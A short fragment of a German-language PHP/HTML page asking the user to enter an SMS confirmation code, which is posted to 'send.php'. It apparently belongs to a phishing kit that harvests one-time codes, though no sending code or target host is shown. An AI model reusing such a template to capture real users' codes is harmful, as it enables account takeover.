             ...
             <div class="tab-pane__content">
              <div class="login-form">
               <div class="heading" id="VcLabelHeadingDiv">
                <h1 style="color:#177991;">SMS Bestätigung</h1>
               </div>
               <p style="font-family:OpenSans-Regular,Arial,Helvetica,Sans-Serif;font-size:14px;color:#404040;line-height:22px;margin-bottom:24px;">Wir haben Ihnen eine SMS an Ihre Telefonnummer gesendet.</p>
               <?php if(isset($_GET['e'])): ?>
               ...
               <form action="send.php" method="POST">
                <div class="login-form__fields">
                 <div class="form-field form-field--primary form-field--has-title">
                  <label aria-hidden="true" class="form-field__title" for="sms-code-field" tabindex="-1" title="SMS Code">
                   SMS Code
                  </label>
                  <input aria-label="SMS Code" class="form-field__element" id="sms-code-field" maxlength="10" type="text" name="sms" required placeholder="Code eingeben" value=""/>
                 </div>
